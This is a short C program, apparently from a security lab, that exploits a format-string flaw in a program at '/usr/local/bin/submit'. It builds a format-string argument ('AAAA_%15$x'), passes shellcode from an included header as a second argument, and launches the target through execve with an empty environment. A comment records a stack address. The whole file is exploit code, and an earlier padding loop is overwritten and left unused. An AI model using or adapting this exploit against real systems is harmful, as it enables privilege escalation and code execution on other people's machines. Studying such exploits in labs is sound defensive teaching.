#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include "shellcode.h"

int main(void) {
  char *args[4], *env[1];

  int load_size = 140 + 1 - strlen("Submission program version 0.1 (") + 4;
  int i;

  args[0] = (char*) malloc(load_size + 1);
  strcpy(args[0], "AAAA");
  for(i = 0; i < (load_size-5)/5; i++) {
    strcat(args[0], "%%08x.");
  }

  strcpy(args[0], "AAAA_%15$x");
  // 0xffbfdf04

  args[1] = "-v";
  args[2] = shellcode;
  args[3] = NULL;

  env[0] = NULL;

  return execve("/usr/local/bin/submit", args, env);
}
